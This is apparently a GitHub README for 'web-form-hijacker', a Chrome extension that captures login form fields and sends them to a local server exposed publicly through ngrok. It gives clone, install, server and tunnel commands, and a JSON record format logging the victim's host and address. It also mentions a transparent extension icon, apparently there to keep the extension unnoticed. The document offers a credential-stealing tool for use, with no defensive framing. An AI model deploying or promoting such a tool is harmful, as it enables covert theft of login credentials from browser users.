# web-form-hijacker
> form hijacking chrome extension

[DownLoad](https://github.com/u4bi/web-form-hijacker/releases/download/v1.0/web-form-hijacker-v.1.0.6.zip)

| NPM Version | Total downloads | Latest release |
| :---: | :---: | :---: |
|  [![Alt text](https://img.shields.io/npm/v/web-form-hijacker.svg)](https://www.npmjs.com/package/web-form-hijacker)  |  [![Alt text](https://img.shields.io/github/downloads/u4bi/web-form-hijacker/total.svg)](https://github.com/u4bi/web-form-hijacker/releases)  |  [![Alt text](https://img.shields.io/github/release/u4bi/web-form-hijacker.svg)](https://github.com/u4bi/web-form-hijacker/releases)  |
-------------------------------------------------

## Install

```bash
$ git clone https://github.com/u4bi/web-form-hijacker.git hi
```

```bash
$ cd hi
```

```bash
$ npm install
```

## Usage

```bash
$ npm run server
```

*[Download ngrok (Because of SSL connection)](https://ngrok.com/download)*
```bash
$ ./ngrok http 7777
```

*Load unpacked extension (chrome://extensions)*

![Alt text](https://raw.githubusercontent.com/u4bi/web-form-hijacker/master/WEB/v0.png)

<hr/>

## Login form field hijacking

![Alt text](https://raw.githubusercontent.com/u4bi/web-form-hijacker/master/WEB/v1.png)

## JSON DB
```json
{
    "id"        : 1,
    "host"      : "www.example.com",
    "user_addr" : "0.0.0.0",
    ...etc
}
```

![Alt text](https://raw.githubusercontent.com/u4bi/web-form-hijacker/master/WEB/v2.png)

### Extension Icon
> transparent color for the Icon

![Alt text](https://raw.githubusercontent.com/u4bi/web-form-hijacker/master/WEB/v3.png)

## License
[MIT](https://github.com/u4bi/web-form-hijacker/blob/master/LICENSE)